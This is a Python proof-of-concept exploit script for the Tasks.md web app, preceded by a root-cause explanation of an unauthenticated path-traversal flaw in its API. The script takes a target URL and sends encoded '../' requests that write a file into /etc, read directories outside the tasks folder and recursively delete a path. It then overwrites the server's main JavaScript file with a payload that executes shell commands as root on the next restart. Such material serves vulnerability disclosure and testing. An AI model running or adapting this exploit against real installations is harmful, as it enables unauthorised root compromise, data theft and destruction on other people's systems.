#!/usr/bin/env python3
"""
Tasks.md (baldissaramatheus/tasks.md) - Unauthenticated path-traversal
arbitrary file WRITE / READ / DELETE -> Remote Code Execution as root.

Root cause (backend/server.js):
  The Koa backend mounts all /_api/* routes with NO authentication
  (app.use(cors()) only). The resource handlers build filesystem paths by
  directly concatenating a user-controlled, decodeURIComponent()'d URL
  segment onto TASKS_DIR with ZERO sanitization:

    createResource  (POST   /_api/resource/:path*) line ~130:
        await fs.promises.writeFile(`${TASKS_DIR}/${subPath}`, content)
    getResource     (GET    /_api/resource/:path*) line ~64/91:
        fs.promises.readdir / readFile(`${TASKS_DIR}/${path}/${lane}/${file}`)
    deleteResource  (DELETE /_api/resource/:path*) line ~174:
        fs.promises.rm(`${TASKS_DIR}/${subPath}`, {recursive:true, force:true})

  subPath may contain ../ (or %2e%2e%2f), escaping TASKS_DIR. The container
  runs `node /api/server.js` as root, and the README's documented run command
  uses `--restart unless-stopped`, so overwriting /api/server.js yields code
  execution as root on the next restart (reboot / update / crash).

Usage: python3 poc.py http://TARGET:8092
"""
import sys, json, urllib.request

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8092").rstrip("/")

def req(method, path, body=None):
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(f"{BASE}/_api{path}", data=data, method=method,
                               headers={"Content-Type": "application/json"})
    try:
        resp = urllib.request.urlopen(r, timeout=15)
        return resp.status, resp.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")

# 1) Arbitrary WRITE outside the tasks dir (../../../etc/ as root)
s, _ = req("POST", "/resource/..%2f..%2f..%2fetc%2fpoc_write.conf",
           {"isFile": True, "content": "unauth-arbitrary-write-as-root"})
print(f"[1] arbitrary WRITE  /etc/poc_write.conf        -> HTTP {s} (201=ok)")

# 2) Arbitrary READ outside the tasks dir (lists <path>/<lane>/*.md)
s, b = req("GET", "/resource/..%2f..%2fopt")
print(f"[2] arbitrary READ   /opt/*/*.md                -> HTTP {s}")
print("    leaked:", b[:200])

# 3) Arbitrary recursive DELETE outside the tasks dir
s, _ = req("DELETE", "/resource/..%2f..%2ftmp%2fpoc_victim")
print(f"[3] arbitrary DELETE /tmp/poc_victim (recursive)-> HTTP {s} (204=ok)")

# 4) RCE: overwrite /api/server.js; executes as root on next restart
payload = (
    "const cp=require('child_process');const fs=require('fs');"
    "try{fs.writeFileSync('/RCE_PROOF.txt','RCE uid='+cp.execSync('id').toString());}catch(e){}"
    "require('http').createServer((q,s)=>s.end('pwned')).listen(8080);"
)
s, _ = req("POST", "/resource/..%2f..%2fapi%2fserver.js",
           {"isFile": True, "content": payload})
print(f"[4] RCE: overwrote /api/server.js               -> HTTP {s} (201=ok)")
print("    -> on next container restart, attacker JS runs as root (writes /RCE_PROOF.txt).")
